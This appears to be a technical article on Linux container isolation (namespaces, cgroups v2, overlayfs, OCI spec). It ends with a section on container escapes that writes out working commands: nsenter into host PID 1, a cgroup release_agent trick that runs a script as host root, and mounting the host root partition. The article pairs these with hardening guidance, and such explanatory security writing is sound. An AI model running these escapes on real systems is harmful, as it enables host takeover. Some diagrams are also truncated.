Container Internals

Namespace isolation deep dive - PID, mount, network, user, cgroup, and time namespaces; cgroups v2 controllers; OCI runtime spec; container escape vectors and mitigations.

Overview

A container is a process, not a virtual machine: the kernel isolates it with namespaces, cgroups, and capabilities rather than a hypervisor. This article walks the isolation primitives one by one, shows how to inspect them from /proc and /sys/fs/cgroup , and finishes with the escape vectors that break each boundary. After reading it you can explain why uname -r is identical inside and outside a container, and measure what a weak container configuration exposes.

  • Kernel Architecture - kernel space layout, privilege model

The Container Is Not a VM

A container is not a virtual machine. There is no hypervisor, no virtual hardware, no BIOS, no separate kernel. A container is a process (or group of processes) that the kernel isolates from the rest of the system using three Linux kernel features: namespaces, cgroups, and capabilities. Understanding containers means understanding these primitives - because every container escape is simply a loophole in one of these isolation mechanisms. 

┌──────────────────────────────────────────────────────────────────────┐
│                     CONTAINER vs VM ISOLATION                          │
│                                                                      │
│  VIRTUAL MACHINE:                                                     │
│  ┌──────────────────────────────┐  ┌──────────────────────────────┐  │
│  │  Guest OS (kernel + usersp)  │  │  Guest OS                    │  │
│  │  - Own kernel (ring 0)       │  │                              │  │
│  │  - Own page tables (EPT/NPT) │  │                              │  │
│  │  - Own device drivers        │  │                              │  │
│  │  - Hardware-enforced isolat. │  │                              │  │
│  └──────────────+───────────────┘  └──────────────+───────────────┘  │
│                 │                                  │                  │
│  ┌──────────────▼──────────────────────────────────▼──────────────┐  │
│  │                     HYPERVISOR (ring -1)                        │  │
│  └─────────────────────────────────────────────────────────────────┘  │
│                                                                      │
│  CONTAINER:                                                          │
│  ┌─────────────────┐  ┌─────────────────┐                           │
│  │ Container A     │  │ Container B     │                           │
│  │ (set of namesp) │  │ (set of namesp) │                           │
│  └────────+────────┘  └────────+────────┘                           │
│           │                    │                                     │
│  ┌────────▼────────────────────▼─────────────────────────────────┐  │

│  │  - One kernel, shared across all containers                    │  │

│  └────────────────────────────────────────────────────────────────┘  │
│                                                                      │

│  The kernel is shared. A kernel exploit in a container = root on host.│

Namespace Primitives

Linux namespaces partition kernel resources so that one set of processes sees one set of resources while another set of processes sees a different set. There are currently eight namespace types.

Linux namespaces overview:

Namespace Type clone() flag What It Isolates
Mount NEWNS Filesystem mount points
UTS NEWUTS Hostname and NIS domain name
IPC NEWIPC System V IPC, POSIX message queues
PID NEWPID Process ID numbers
Network NEWNET Network devices, stacks, ports
User NEWUSER User and group IDs
Cgroup NEWCGROUP Cgroup root directory
Time NEWTIME Monotonic and boot-time clocks (5.6+)

Namespaces in /proc

# Every process has a namespace file for each namespace type
ls -la /proc/self/ns/
# cgroup  ipc  mnt  net  pid  pid_for_children  time  time_for_children
# user  uts

# Each file is a symlink to a namespace identifier:
# mnt -> mnt:[4026531841]
# The number in brackets is the namespace inode number.
# Two processes sharing the same inode are in the same namespace.
readlink /proc/self/ns/pid
# pid:[4026531836]

# Compare namespaces between two processes:
stat -c %i /proc/self/ns/pid /proc/1/ns/pid
# Same inode -> same PID namespace

PID Namespaces

PID namespaces create nested PID numbering. A process has one PID in each ancestor PID namespace. The "init" process (PID 1) of each PID namespace has special responsibilities: it adopts orphaned children and must handle signals properly. If PID 1 dies in a namespace, the kernel sends SIGKILL to all other processes in that namespace. 

┌──────────────────────────────────────────────────────────────────────┐
│                      PID NAMESPACE NESTING                             │
│                                                                      │
│  Initial PID namespace (host):                                        │
│    PID 1:  /sbin/init (systemd)                                       │
│    PID 42: podman                                                    │
│    PID 43: └─ conmon (container monitor)                             │
│    PID 44:    └─ bash (container entrypoint)  ← NS PID 1            │
│    PID 45:       └─ nginx: master             ← NS PID 2            │
│    PID 46:          └─ nginx: worker           ← NS PID 3            │
│    PID 47:             └─ nginx: worker        ← NS PID 4            │
│                                                                      │
│  Inside the container's PID namespace:                                │
│    PID 1:  bash (host PID 44)                                         │
│    PID 2:  nginx: master (host PID 45)                                │
│    PID 3:  nginx: worker (host PID 46)                                │
│    PID 4:  nginx: worker (host PID 47)                                │
│                                                                      │
│  Inside nested container (pod inside pod):                            │
│    PID 1:  bash (host PID 48, outer NS PID 8)                        │
│    PID 2:  sleep (host PID 49, outer NS PID 9)                       │
│                                                                      │
│  Visibility rules:                                                    │
│  - Process can only see (kill/signal) processes in its own PID NS    │
│  - or in descendant PID namespaces it created                        │
│  - /proc from host shows ALL processes (if mounted from host NS)     │
│  - Inside container /proc, only container's PID NS processes appear  │
│  - PID 1 in a PID namespace is special (signal handling, reaping)    │
└──────────────────────────────────────────────────────────────────────┘

Creating a PID namespace

# Create a new PID namespace and run a shell
sudo unshare --pid --fork --mount-proc bash

# Inside this namespace:
echo $$           # Shows: 1
ps aux            # Shows only processes in this NS
ls /proc          # Only PID 1 and self

# From host (another terminal):
ls /proc          # Shows the bash as a regular PID

# Checking the PID namespace hierarchy:
sudo lsns -t pid
#        NS TYPE   NPROCS   PID USER   COMMAND
# 4026531836 pid       342     1 root   /sbin/init
# 4026532000 pid         2 12345 root   bash
# The NPROCS column shows child namespaces inherit from parent.

Mount Namespaces

Mount namespaces give each container an independent set of mount points. Changes in one mount namespace are invisible to others. This is the basis for container filesystem images: pivot_root() into the container's rootfs, then mount /proc , /sys , etc. 

┌──────────────────────────────────────────────────────────────────────┐
│                     MOUNT NAMESPACE ISOLATION                          │
│                                                                      │
│  Host mount namespace:                                                │
│    /                   (ext4, /dev/sda2)                              │
│    ├── /proc           (proc)                                         │
│    ├── /sys            (sysfs)                                        │
│    ├── /dev            (devtmpfs)                                     │
│    ├── /home           (ext4, /dev/sda3)                              │
│    └── /var/lib/containers/...  ← container rootfs storage             │
│                                                                      │
│  Container mount namespace (after pivot_root + mounts):               │
│    /                   (overlay: lowerdir+upperdir from host)         │
│    ├── /proc           (proc, remounted)                              │
│    ├── /sys            (sysfs, remounted)                             │
│    ├── /dev            (tmpfs + device nodes)                         │
│    ├── /etc/hostname   (bind mount from host)                        │
│    └── /var/run/secrets (tmpfs for secrets)                           │
│                                                                      │
│  Mount events visible on host (if shared subtrees):                   │
│    cat /proc/self/mountinfo | grep container                         │
│    # Shows overlay lowerdir/upperdir/workdir for each container       │
│    # With mount propagation set to 'private', mounts are isolated.    │
│    # With 'shared', mount events propagate (dangerous default).       │
└──────────────────────────────────────────────────────────────────────┘

Mount Namespace Setup

# Create a new mount namespace
sudo unshare --mount bash

# Inside the new namespace, mounts are independent
mount -t tmpfs tmpfs /mnt
echo "data" > /mnt/test

# In another terminal (host), /mnt is NOT mounted
ls /mnt/test  # No such file (or still empty)

# Inspect mount namespace details:
sudo cat /proc/self/mountinfo | head -20
# Each line includes mount ID, parent ID, root, mount point, options

# Shared subtrees (mount propagation):
cat /proc/self/mountinfo | grep shared
# shared:X = mount events propagate to peers with same X
# master:X = receives events from peer group X
# private  = no propagation (what containers typically want)

Network Namespace - Virtual Interfaces

Each network namespace has its own network stack: interfaces, routing tables, iptables rules, and socket listings. Containers typically get a veth pair - one end in the container, one end in a bridge on the host. 

┌──────────────────────────────────────────────────────────────────────┐
│                     NETWORK NAMESPACE ISOLATION                        │
│                                                                      │
│  ┌──────────────────────────────────────────────────────────────┐   │

│  │                                                               │   │
│  │  ┌─────────┐  ┌──────────┐  ┌───────────────────────────┐   │   │
│  │  │ eth0    │  │ docker0  │  │ Container A veth (host)   │   │   │
│  │  │ 10.0.0.2│  │ bridge   │  │ vethA@if5                 │   │   │
│  │  └─────────┘  │ 172.17.0│  │ 172.17.0.2               │   │   │
│  │               │   .1     │  └─────────────+─────────────┘   │   │
│  │               └────+─────┘                │                  │   │
│  │                    │                      │ (veth pair)      │   │
│  └────────────────────+──────────────────────+──────────────────┘   │
│                       │                      │                       │
│  ┌────────────────────+──────────────────────+──────────────────┐   │
│  │         Container A Network Namespace     │                   │   │
│  │                    │                      │                   │   │
│  │               ┌────+─────┐           ┌────+─────┐            │   │

│  │               │  present) │           │   0.2    │            │   │
│  │               └──────────┘           └──────────┘            │   │
│  │                                                               │   │
│  │  $ ip link show        # Shows only container interfaces      │   │
│  │  $ ss -tlnp            # Shows only container sockets         │   │

Network Namespace and veth

# Create a new network namespace
sudo ip netns add testns

# Create a veth pair
sudo ip link add veth0 type veth peer name veth1

# Move veth1 into the namespace
sudo ip link set veth1 netns testns

# Configure host-side interface
sudo ip addr add 10.0.0.1/24 dev veth0
sudo ip link set veth0 up

# Configure namespace-side interface
sudo ip netns exec testns ip addr add 10.0.0.2/24 dev veth1
sudo ip netns exec testns ip link set veth1 up
sudo ip netns exec testns ip link set lo up

# Test connectivity
ping -c 1 10.0.0.2
sudo ip netns exec testns ping -c 1 10.0.0.1

# List all network namespaces
sudo ip netns list

# Run a command inside the namespace
sudo ip netns exec testns bash
# Inside this shell: ip addr shows only lo and veth1
# ss -tlnp shows only this namespace's listening sockets

User Namespace - UID/GID Mapping

User namespaces are the most complex and security-critical namespace type. They allow a process to have root privileges (UID 0) inside the namespace while being unprivileged (UID 1000) outside. This is the feature that enables "rootless containers." 

┌──────────────────────────────────────────────────────────────────────┐
│                      USER NAMESPACE MAPPING                            │
│                                                                      │
│  Host UID space:                                                      │
│    UID 0 (root)     — full system privileges                          │
│    UID 1000 (alice) — unprivileged user                               │
│    UID 65534 (nobody)                                                 │
│                                                                      │
│  Inside user namespace (with mapping 0:1000:1, 1:100000:65536):       │
│    Inside UID 0     → maps to host UID 1000 (alice, unprivileged)     │
│    Inside UID 1     → maps to host UID 100000 (subordinate UID)       │
│    Inside UID 65536 → maps to host UID 165535                         │
│                                                                      │
│  Mapping configuration:                                                │
│    /etc/subuid:  alice:100000:65536                                    │
│    /etc/subgid:  alice:100000:65536                                    │
│                                                                      │
│  What "root inside the container" actually means:                      │
│    - Inside: can chown, mknod, mount (certain types), setns            │
│    - Outside: has ONLY alice's host privileges                         │
│    - Key difference from true root:                                    │
│      - Cannot read /etc/shadow (host inode permissions)                │
│      - Cannot kill processes outside the user namespace                │
│      - Cannot load kernel modules                                      │
│      - vfs_create/mknod/etc check the HOST UID, not namespace UID     │
│                                                                      │
│  Diagram: capability checks use the INITIAL user namespace's UID:      │
│                                                                      │
│  ┌────────────┐    capability check    ┌─────────────────┐           │
│  │ Container  │─── ns_capable() ──────►│ ns_capable()     │           │
│  │ UID 0      │    (checks NS UID)     │ sees UID 0       │           │
│  │            │                        │ → GRANTED        │           │
│  └────────────┘                        └─────────────────┘           │
│                                                                      │
│  ┌────────────┐    capability check    ┌─────────────────┐           │
│  │ Container  │─── capable() ─────────►│ capable()        │           │
│  │ UID 0      │    (checks initial NS) │ sees UID 1000    │           │
│  │            │                        │ → DENIED         │           │
│  └────────────┘                        └─────────────────┘           │
└──────────────────────────────────────────────────────────────────────┘

Creating and inspecting user namespaces

# Create a user namespace with UID mapping
unshare --user --map-root-user bash

# Inside this namespace:
id
# uid=0(root) gid=0(root) groups=0(root)

# But try something that checks the initial user namespace:
cat /etc/shadow
# Permission denied — the VFS checks the host UID (1000), not NS UID (0)

# Inspect the UID mapping:
cat /proc/self/uid_map
#          0       1000          1
#  (inside_uid) (host_uid) (count)

cat /proc/self/gid_map
#          0       1000          1

# Check subordinate UIDs configured for your user:
cat /etc/subuid
# alice:100000:65536

cat /etc/subgid
# alice:100000:65536

# What can a user namespace root do that a regular user can't?
# - Create new namespaces (mount, PID, network, etc.)
# - Change ownership of files it owns (manipulate capabilities on files)
# - Mount certain filesystem types (FUSE, overlay with userxattr)

Cgroups v2 - Resource Control

Control groups (cgroups) limit, account for, and isolate resource usage. Cgroups v2 (unified hierarchy) is the modern interface; cgroups v1 is deprecated.

Cgroups v2 controllers:

Controller What It Controls
cpu CPU bandwidth (quota + period), real-time scheduling
cpuset CPU core + memory node pinning
memory Memory usage limit, OOM behavior, swap limit
io Block I/O bandwidth and IOPS limits
pids Maximum number of processes in the cgroup
hugetlb HugeTLB page usage limits
rdma RDMA/IB resource limits
misc Miscellaneous scalar resources
perf_event Perf events monitoring (per-cgroup)
freezer Freeze/suspend all processes in cgroup

Cgroups v2 interface

# Check cgroup version in use
mount | grep cgroup
# cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime)

# Check which controllers are enabled
cat /sys/fs/cgroup/cgroup.controllers
# cpuset cpu io memory hugetlb pids rdma misc

# Check which controllers are enabled for this process's cgroup
cat /sys/fs/cgroup/cgroup.subtree_control

# See current cgroup
cat /proc/self/cgroup
# 0::/user.slice/user-1000.slice/session-3.scope

# Container cgroup hierarchy
ls /sys/fs/cgroup/machine.slice/libpod-*
# Contains container-specific cgroup with resource limits

# Podman sets limits via the cgroup interface:
sudo cat /sys/fs/cgroup/machine.slice/libpod-<ID>.scope/memory.max
# Shows memory limit in bytes (e.g., 1073741824 = 1 GB)

sudo cat /sys/fs/cgroup/machine.slice/libpod-<ID>.scope/pids.max
# Shows PID limit (e.g., 100)

# Memory pressure notification (PSI — Pressure Stall Information):
cat /sys/fs/cgroup/machine.slice/libpod-<ID>.scope/memory.pressure
# some avg10=0.00 avg60=0.00 avg300=0.00 total=0
# full avg10=0.00 avg60=0.00 avg300=0.00 total=0

Set cgroup v2 Limits

# Create a cgroup and set limits
sudo mkdir /sys/fs/cgroup/test.slice

# Enable controllers for children
echo "+cpu +memory +pids" | sudo tee /sys/fs/cgroup/test.slice/cgroup.subtree_control

# Create a child cgroup
sudo mkdir /sys/fs/cgroup/test.slice/container

# Set memory limit to 256 MB
echo "268435456" | sudo tee /sys/fs/cgroup/test.slice/container/memory.max

# Set CPU limit to 0.5 cores (quota=50000us per period=100000us)
echo "50000 100000" | sudo tee /sys/fs/cgroup/test.slice/container/cpu.max

# Set PID limit
echo "50" | sudo tee /sys/fs/cgroup/test.slice/container/pids.max

# Move current shell into the cgroup
echo $$ | sudo tee /sys/fs/cgroup/test.slice/container/cgroup.procs

# Verify limits are in effect
cat /sys/fs/cgroup/test.slice/container/memory.current
cat /sys/fs/cgroup/test.slice/container/pids.current

Overlay Filesystem

Container images are stored and served using overlay filesystems (overlayfs), which stack multiple directories into a single merged view: 

┌──────────────────────────────────────────────────────────────────────┐
│                     OVERLAYFS ARCHITECTURE                             │
│                                                                      │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │                      MERGED VIEW                               │   │
│  │  /var/lib/containers/storage/overlay/<ID>/merged/              │   │
│  │                                                               │   │
│  │  This is what the container sees as "/".                      │   │
│  │  ┌─────────────────────────────────────────────────────┐      │   │
│  │  │  File: /usr/bin/python  ← from lowerdir (read-only)  │      │   │
│  │  │  File: /etc/hostname    ← from upperdir (modified)   │      │   │
│  │  │  File: /etc/passwd      ← from upperdir (modified)   │      │   │
│  │  │  File: /usr/bin/myapp   ← from upperdir (new file)   │      │   │
│  │  │  File: /usr/bin/bash    ← from lowerdir (read-only)  │      │   │
│  │  └─────────────────────────────────────────────────────┘      │   │
│  └──────+──────────+──────────+───────────────────────────────┘   │
│         │          │          │                                    │
│  ┌──────▼────┐┌────▼─────┐┌──▼──────────────┐                     │
│  │ UPPERDIR  ││ WORKDIR  ││ LOWERDIR(s)      │                     │
│  │ (rw)      ││ (internal││ (ro, multiple)   │                     │
│  │           ││  work)   ││                  │                     │
│  │  - /etc/ ││          ││ Layer 3: app code │                     │
│  │    host- ││  Used    ││ Layer 2: python   │                     │
│  │    name  ││  for     ││ Layer 1: base OS  │                     │
│  │  - /etc/ ││  copy-up ││ Layer 0: scratch  │                     │
│  │    passwd││  and     ││                  │                     │
│  │  - /usr/ ││  atomic  ││ Lower layers are │                     │
│  │    bin/  ││  operat- ││ immutable — any  │                     │
│  │    myapp ││  ions    ││ modification     │                     │
│  └─────────┘└─────────┘│  triggers copy-up │                     │
│                         │  to upperdir      │                     │
│                         └─────────────────┘                      │
│                                                                      │
│  Copy-on-write mechanism:                                             │
│  1. Container opens file for writing                                  │
│  2. File exists in lowerdir (read-only layer)                         │
│  3. overlayfs copies the file to upperdir (copy-up)                   │
│  4. Container writes to the copy in upperdir                          │
│  5. Subsequent reads return the upperdir version                      │
│                                                                      │
│  To delete a file from lowerdir:                                      │
│  1. overlayfs creates a "whiteout" file in upperdir                    │
│  2. Whiteout = character device 0:0 in the same directory             │
│  3. overlayfs hides the lowerdir file in the merged view               │
│                                                                      │
│  Directory operations:                                                │
│  - Opaque directories: a directory with xattr "trusted.overlay.opaque=y"│
│    in upperdir hides all contents of the corresponding lowerdir dir   │
│  - Merged directories: entries from all layers appear merged           │
└──────────────────────────────────────────────────────────────────────┘

Inspecting overlay mounts

# Find overlay mounts for containers
sudo cat /proc/self/mountinfo | grep overlay

# Example output line:
# 123 456 0:67 / /var/lib/containers/storage/overlay/abc123/merged \
#   rw,relatime - overlay overlay \
#   rw,lowerdir=/var/lib/containers/storage/overlay/l/AA:/var/lib/.../l/BB, \
#   upperdir=/var/lib/containers/storage/overlay/abc123/diff, \
#   workdir=/var/lib/containers/storage/overlay/abc123/work

# Explore a container's filesystem from the host:
sudo ls -la /var/lib/containers/storage/overlay/

# The 'l' directory contains shortened symlinks to layer directories
ls -la /var/lib/containers/storage/overlay/l/

# Podman inspect reveals the overlay structure:
podman inspect <container> | jq '.[0].GraphDriver'

OCI Runtime Spec

The Open Container Initiative (OCI) defines standards for container images and runtimes. The runtime spec describes config.json - the JSON document that tells a runtime (runc, crun, youki, gvisor) how to set up a container. 

┌──────────────────────────────────────────────────────────────────────┐
│                     OCI RUNTIME SPEC                                   │
│                                                                      │
│  config.json structure:                                                │
│                                                                      │
│  {                                                                   │
│    "ociVersion": "1.1.0",                                            │
│    "process": {                                                       │
│      "terminal": true,                                                │
│      "user": {"uid": 0, "gid": 0},                                   │

Container Escape Techniques

Understanding escape vectors is essential for building secure containers. Every escape is a failure of namespace, cgroup, or capability isolation. 

┌──────────────────────────────────────────────────────────────────────┐
│                     CONTAINER ESCAPE VECTORS                           │
│                                                                      │
│  1. Privileged container (--privileged):                              │
│     ┌─────────────────────────────────────────────────────────┐     │
│     │  --privileged ≈ --cap-add=ALL + disable seccomp +        │     │
│     │                + disable AppArmor/SELinux + all devices  │     │
│     │                                                           │     │
│     │  Escape via nsenter:                                       │     │
│     │    nsenter --target 1 --mount --uts --ipc --net --pid bash │     │
│     │  This enters host PID 1's namespaces → full host access.  │     │
│     │                                                           │     │
│     │  Escape via cgroup release_agent:                          │     │
│     │    mkdir /tmp/cgrp && mount -t cgroup -o memory cgrp /tmp │     │
│     │    echo 1 > /tmp/cgrp/x/notify_on_release                     │     │
│     │    echo '#!/bin/sh' > /cmd                                    │     │
│     │    echo 'nsenter --target 1 ...' >> /cmd                     │     │
│     │    echo "/cmd" > /tmp/cgrp/release_agent                      │     │
│     │    # Trigger: kill last process in cgroup → release_agent   │     │
│     │    # Executes /cmd on the HOST as root!                     │     │
│     └─────────────────────────────────────────────────────────┘     │
│                                                                      │
│  2. Container socket mount (/run/podman/podman.sock):                  │
│     - Mounting the container socket inside a container gives API access │
│     - podman run -v /:/host -it alpine chroot /host                   │
│     - podman run --privileged --pid=host alpine nsenter ...            │
│     - Essentially: socket access = full host compromise              │
│                                                                      │
│  3. Capability abuse:                                                │
│     CAP_SYS_ADMIN: mount filesystems, create namespaces,              │
│                    pivot_root, perform many privileged ops            │
│     CAP_SYS_PTRACE: trace host processes, inject code                 │
│     CAP_SYS_MODULE: load arbitrary kernel modules                     │
│     CAP_NET_RAW: raw sockets, packet injection/sniffing              │
│     CAP_SYS_RAWIO: iopl/ioperm, direct hardware access                │
│     CAP_SYS_BOOT: kexec_load — boot new kernel                       │
│                                                                      │
│  4. Kernel exploit from container:                                    │
│     - Container runs with host kernel                                 │
│     - Any kernel privilege escalation vulnerability = escape          │
│     - Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847)          │
│     - The kernel doesn't care which namespace you're in for exploits  │
│                                                                      │
│  5. Procfs/sysfs leak:                                                │
│     - /proc/sysrq-trigger (if mounted rw): echo b > reboot host       │
│     - /proc/kcore: read entire host physical memory                   │
│     - /proc/kallsyms: leak kernel addresses (bypass KASLR)            │
│     - /sys/kernel/debug: extensive kernel debugging interfaces         │
│     - /dev/mem, /dev/kmem: direct physical/kernel memory access        │
│                                                                      │
│  6. Device node access:                                               │
│     - Mount host's /dev in container → access all host block devices  │
│     - Mount host root partition → mount /dev/sda2 /mnt               │
│     - Then: chroot /mnt → you're on the host filesystem               │
└──────────────────────────────────────────────────────────────────────┘

Escape Demonstration

# WARNING: For educational purposes only on a disposable VM

# Escape scenario 1: Privileged container
sudo podman run -it --privileged alpine sh
# Inside container:
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# You are now root on the HOST

# Escape scenario 2: Mounted container runtime socket
sudo podman run -it -v /run/podman/podman.sock:/run/podman/podman.sock \
  -v /:/host docker.io/alpine sh
# Inside container:
chroot /host bash
# You have full access to the host filesystem

# Escape scenario 3: Host PID namespace
sudo podman run -it --pid=host alpine sh
# Inside container:
# You can see ALL host processes
ps aux
# You can strace/attach to any host process (if capabilities permit)

# Escape scenario 4: CAP_SYS_ADMIN abuse
sudo podman run -it --cap-add=SYS_ADMIN alpine sh
# Inside container:
mkdir /tmp/host_mnt
mount /dev/sda2 /tmp/host_mnt  # mount host root partition
ls /tmp/host_mnt               # access host filesystem

Container Security Best Practices

Container security controls:

Control Description
--read-only Mount rootfs read-only. Prevents tampering.
--no-new-privs Prevents SUID binaries and capability gain.
--cap-drop=ALL Drop all capabilities first.
--cap-add=X Add back only needed capabilities.
--security-opt seccomp profile, AppArmor, SELinux label.
--user 1000:1000 Run as non-root user inside container.
--userns=auto User namespace remapping (rootless).
--cgroupns=private Private cgroup namespace.
--ipc=private Private IPC namespace.
--pids-limit=100 Limit number of processes (fork bomb defense).
--memory=256m Memory limit (OOM defense).
--cpu-quota=50000 CPU bandwidth limit (noisy neighbor defense).
--tmpfs /tmp tmpfs for writable areas (no disk spill).
--device=/dev/X Explicit device access (instead of all devices)

Secure container run command

# Minimal-privilege container (Podman)
podman run \
  --read-only \
  --read-only-tmpfs=true \
  --no-new-privileges \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --security-opt=no-new-privileges \
  --security-opt=seccomp=/usr/share/containers/seccomp.json \
  --user=1000:1000 \
  --userns=keep-id \
  --cgroupns=private \
  --ipc=private \
  --pids-limit=100 \
  --memory=256m \
  --cpu-quota=50000 \
  --tmpfs /tmp:rw,noexec,nosuid,size=64M \
  --tmpfs /var/tmp:rw,noexec,nosuid,size=64M \
  docker.io/nginx:latest
